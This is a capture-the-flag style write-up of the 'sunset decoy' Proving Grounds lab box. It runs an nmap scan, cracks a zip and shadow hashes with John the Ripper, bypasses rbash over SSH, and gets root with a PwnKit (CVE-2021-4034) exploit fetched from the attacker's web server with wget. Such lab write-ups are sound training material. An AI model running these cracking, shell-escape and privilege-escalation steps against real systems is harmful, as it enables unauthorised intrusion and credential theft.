---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/sunset-decoy,505/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version. 

# discovery

We are starting with a simple `nmap` port scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn 192.168.183.85                      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-03 08:23 EST
Nmap scan report for 192.168.183.85
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds
```

## website (port 80)
![website](/images/sunsetdecoy_website.png)

After downloading the available file `save.zip` we will analyze it.

---

# exploitation
## password protected `zip` file
```bash
$ unzip save.zip   
Archive:  save.zip
[save.zip] etc/passwd password:
```

> The file is password protected.
{: .prompt-danger }

Create `zip` hash file
```bash
$ zip2john save.zip                                                                                                                                                      80 ⨯
ver 2.0 efh 5455 efh 7875 save.zip/etc/passwd PKZIP Encr: TS_chk, cmplen=668, decmplen=1807, crc=B3ACDAFE ts=90AB cs=90ab type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/shadow PKZIP Encr: TS_chk, cmplen=434, decmplen=1111, crc=E11EC139 ts=834F cs=834f type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/group PKZIP Encr: TS_chk, cmplen=460, decmplen=829, crc=A1F81C08 ts=8D07 cs=8d07 type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/sudoers PKZIP Encr: TS_chk, cmplen=368, decmplen=669, crc=FF05389F ts=1535 cs=1535 type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/hosts PKZIP Encr: TS_chk, cmplen=140, decmplen=185, crc=DFB905CD ts=8759 cs=8759 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** save.zip/etc/hostname PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=D9C379A9 ts=8CE8 cs=8ce8 type=0
save.zip:$pkzip$6*1*1*0*8*24*8759*a7409df1d7a76ad3809794d387209855bb7638aa589d5be62b9bf373d78055e1dd351925*1*0*8*24*1535*459926ee53809fa53fe26c3e4548cd7819791a638c8d96d3ec7cf18477ffa1e9e2e77944*1*0*8*24*834f*7d2cbe98180e5e9b8c31c5aec89c507011d26766981d17d249e5886e51ac03270b009d62*1*0*8*24*8d07*7d51a96d3e3fa4083bbfbe90ee97ddba1f39f769fcf1b2b6fd573fdca8c97dbec5bc9841*1*0*8*24*90ab*f7fe58aeaaa3c46c54524ee024bd38dae36f3110a07f1e7aba266acbf8b5ff0caf42e05e*2*0*2d*21*d9c379a9*9b9*46*0*2d*8ce8*aae40dfa55b72fd591a639c8c6d35b8cabd267f7edacb40a6ddf1285907b062c99ec6cc8b55d9f0027f553a44f*$/pkzip$::save.zip:etc/hostname, etc/hosts, etc/sudoers, etc/shadow, etc/group, etc/passwd:save.zip
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Save hash to a file named `ziphash.txt`
```bash
$ cat ziphash.txt    
save.zip:$pkzip$6*1*1*0*8*24*8759*a7409df1d7a76ad3809794d387209855bb7638aa589d5be62b9bf373d78055e1dd351925*1*0*8*24*1535*459926ee53809fa53fe26c3e4548cd7819791a638c8d96d3ec7cf18477ffa1e9e2e77944*1*0*8*24*834f*7d2cbe98180e5e9b8c31c5aec89c507011d26766981d17d249e5886e51ac03270b009d62*1*0*8*24*8d07*7d51a96d3e3fa4083bbfbe90ee97ddba1f39f769fcf1b2b6fd573fdca8c97dbec5bc9841*1*0*8*24*90ab*f7fe58aeaaa3c46c54524ee024bd38dae36f3110a07f1e7aba266acbf8b5ff0caf42e05e*2*0*2d*21*d9c379a9*9b9*46*0*2d*8ce8*aae40dfa55b72fd591a639c8c6d35b8cabd267f7edacb40a6ddf1285907b062c99ec6cc8b55d9f0027f553a44f*$/pkzip$::save.zip:etc/hostname, etc/hosts, etc/sudoers, etc/shadow, etc/group, etc/passwd:save.zip
```

Crack the hash
```bash
$ john ziphash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
manuel           (save.zip)     
1g 0:00:00:00 DONE 2/3 (2022-12-03 08:30) 14.28g/s 1082Kp/s 1082Kc/s 1082KC/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> The password for the `zip` file is `manuel`.
{: .prompt-info }

Unzip the `zip` file
```bash
$ unzip save.zip     
Archive:  save.zip
[save.zip] etc/passwd password: 
  inflating: etc/passwd              
  inflating: etc/shadow              
  inflating: etc/group               
  inflating: etc/sudoers             
  inflating: etc/hosts               
 extracting: etc/hostname
```

## get `ssh` logins
At first we unshadow the gathered `passwd` and `shadow` file.
```bash
$ unshadow passwd shadow 
root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:*:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:*:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:*:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:*:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:*:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:*:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:*:106:65534::/run/sshd:/usr/sbin/nologin
avahi:*:107:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:*:108:118::/var/lib/saned:/usr/sbin/nologin
colord:*:109:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:*:110:7:HPLIP system user,,,:/var/run/hplip:/bin/false
systemd-coredump:!!:999:999:systemd Core Dumper:/:/usr/sbin/nologin
296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash
```

Now we are saving the hashes of the users `root` and `296640a3b825115a47b68fc44501c828` to a file named `hashes.txt`
```bash
cat hashes.txt 
root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:0:0:root:/root:/bin/bash
296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash
```

Trying to crack the hashes using the password list `rockyou.txt`
```bash
$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
server           (296640a3b825115a47b68fc44501c828)     
1g 0:00:00:05 7.88% 2/3 (ETA: 08:35:44) 0.1845g/s 2333p/s 2664c/s 2664C/s erin1..peggy1
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

> Yay! We got credentials for a user: `296640a3b825115a47b68fc44501c828:server`.
{: .prompt-info }

## login via `ssh`
```bash
$ ssh 296640a3b825115a47b68fc44501c828@192.168.183.85                                                                                                                   130 ⨯
296640a3b825115a47b68fc44501c828@192.168.183.85's password: 
Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
-rbash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ id
uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) 
groups=1000(296640a3b825115a47b68fc44501c828)
```

> And we are logged in!
{: .prompt-info }

---

# post exploitation
## bypassing `rbash`

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cd ..
-rbash: cd: restricted
```

> Unfortunately we are in a restricted `bash` shell.
{: .prompt-danger }

```bash
$ ssh 296640a3b825115a47b68fc44501c828@192.168.183.85 "bash --noprofile"                                                                                                127 ⨯
296640a3b825115a47b68fc44501c828@192.168.183.85's password: 
id
uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) groups=1000(296640a3b825115a47b68fc44501c828)
cd ..
pwd
/home
```

> We can bypass this resrtriction by executing `bash` without a profile while logging in via `ssh`
{: .prompt-info }

## getting first flag
```bash
pwd
/home/296640a3b825115a47b68fc44501c828
ls
honeypot.decoy
honeypot.decoy.cpp
id
ifconfig
local.txt
ls
mkdir
user.txt
cat local.txt
b******************************8
```

## privilege escalation

The box is vulnerable to the (`pwnkit`)[https://github.com/arthepsy/CVE-2021-4034] vulnerabillity.  
At first we download the source to our attacker machine and save the file as `lpe.c`
```bash
$ cat lpe.c                    
/*
 * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
 * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell = 
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n\n"
...
```

Then we provide a web server to upload the file to the target.
```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Upload the file to the target.
```bash
cd /tmp
wget http://192.168.49.183/lpe.c
--2022-12-03 09:36:34--  http://192.168.49.183/lpe.c
Connecting to 192.168.49.183:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1267 (1.2K) [text/x-csrc]
Saving to: ‘lpe.c’

     0K .                                                     100% 3.16M=0s

2022-12-03 09:36:34 (3.16 MB/s) - ‘lpe.c’ saved [1267/1267
```

At our attacker machine we see that the file was requested by the target after we executed the `wget` command.
```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.183.85 - - [03/Dec/2022 09:36:34] "GET /lpe.c HTTP/1.1" 200 -
```

Now we are compiling the file and set the permissions on the target.
```bash
gcc lpe.c -o lpe
chmod +x lpe
```

Exeucte the binary to get `root` access.
```bash
./lpe
id
uid=0(root) gid=0(root) groups=0(root),1000(296640a3b825115a47b68fc44501c828)
```

> And we got a `root` shell!
{: .prompt-info }

## get the second flag
```bash
cd /root
ls
chkrootkit-0.49
proof.txt
root.txt
script.sh
cat proof.txt
b******************************a
```

Pwned! <@:-)
